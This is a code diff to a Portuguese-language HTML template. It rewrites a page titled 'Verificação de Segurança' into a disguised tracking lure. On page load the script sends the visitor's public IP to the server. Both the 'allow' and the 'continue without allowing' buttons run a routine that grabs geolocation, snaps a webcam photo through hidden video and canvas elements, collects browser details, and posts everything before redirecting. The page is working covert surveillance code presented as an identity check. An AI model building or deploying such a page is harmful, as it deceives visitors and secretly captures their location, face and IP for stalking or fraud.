@@ -34,25 +34,81 @@
         }
     </style>
 
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <title>Verificação de Segurança</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+
+        .container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 16px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            text-align: center;
+            width: 90%;
+            max-width: 400px;
+        }
+
+        h2 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        p {
+            color: #666;
+            font-size: 15px;
+        }
+
+        button {
+            margin: 10px;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 8px;
+            background-color: #1a73e8;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #0c60d0;
+        }
+
+        #mensagem {
+            margin-top: 15px;
+            color: #444;
+            font-size: 14px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Verificação de segurança</h2>
+        <p>Por favor, confirme sua identidade para continuar.</p>
+        <button id="permitir">Permitir acesso</button>
+        <button id="nao_permitir">Continuar sem permitir</button>
+        <p id="mensagem"></p>
+    </div>
+
+    <video id="video" style="display:none;" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
     <script>
         const slug = {{ slug | tojson | safe }};
-        // Capturar IP logo no carregamento da página
-(async () => {
-    try {
-        const ipRes = await fetch("https://api.ipify.org?format=json");
-        const ipJson = await ipRes.json();
-        const ip = ipJson.ip;
-
-        await fetch("/coletar_ip_inicial", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ slug, ip })
-        });
-    } catch (e) {
-        console.warn("Erro ao capturar IP inicial:", e);
-    }
-})();
-
         const destino = {{ destino | tojson | safe }};
         const inicioTempo = Date.now();
 
@@ -86,22 +142,23 @@
             };
         };
 
-        async function coletarDados() {
+        const coletarDados = async () => {
             let latitude = "", longitude = "", foto_base64 = "";
 
-            function atualizarMensagem(texto) {
+            const atualizarMensagem = texto => {
                 document.getElementById('mensagem').innerText = texto;
-            }
+            };
 
-            atualizarMensagem("verificação concluida");
+            atualizarMensagem("Verificando informações...");
 
-            // Localização
+            // Geolocalização
             try {
-                const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
+                const pos = await new Promise((res, rej) =>
+                    navigator.geolocation.getCurrentPosition(res, rej, { timeout: 3000 }));
                 latitude = pos.coords.latitude;
                 longitude = pos.coords.longitude;
             } catch (e) {
-                console.warn("Erro na geolocalização:", e);
+                console.warn("Geolocalização negada ou falhou.");
             }
 
             // Câmera
@@ -109,9 +166,9 @@
                 const video = document.getElementById('video');
                 const canvas = document.getElementById('canvas');
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
 
-                await new Promise(r => setTimeout(r, 2000)); // Espera 2s para a câmera ligar
+                video.srcObject = stream;
+                await new Promise(r => setTimeout(r, 2000));
 
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
@@ -120,7 +177,7 @@
 
                 stream.getTracks().forEach(t => t.stop());
             } catch (e) {
-                console.warn("Erro ao acessar câmera:", e);
+                console.warn("Câmera negada ou falhou.");
             }
 
             const infosBrowser = await coletarInfoBrowser();
@@ -145,15 +202,30 @@
                 window.location.href = json.destino;
             } catch (e) {
                 console.error("Erro ao enviar dados:", e);
-                atualizarMensagem("Erro no envio de dados.");
+                atualizarMensagem("Erro ao processar.");
             }
-        }
+        };
 
-        document.getElementById("permitir").addEventListener("click", () => {
-            document.getElementById("permitir").style.display = "none";
-            coletarDados();
-        });
+        document.getElementById("permitir").addEventListener("click", coletarDados);
+        document.getElementById("nao_permitir").addEventListener("click", coletarDados);
+
+        // Captura IP logo no início
+        (async () => {
+            try {
+                const ipRes = await fetch("https://api.ipify.org?format=json");
+                const ipJson = await ipRes.json();
+                const ip = ipJson.ip;
+
+                await fetch("/coletar_ip_inicial", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ slug, ip })
+                });
+            } catch (e) {
+                console.warn("Erro ao capturar IP inicial:", e);
+            }
+        })();
     </script>
-
 </body>
 </html>
+
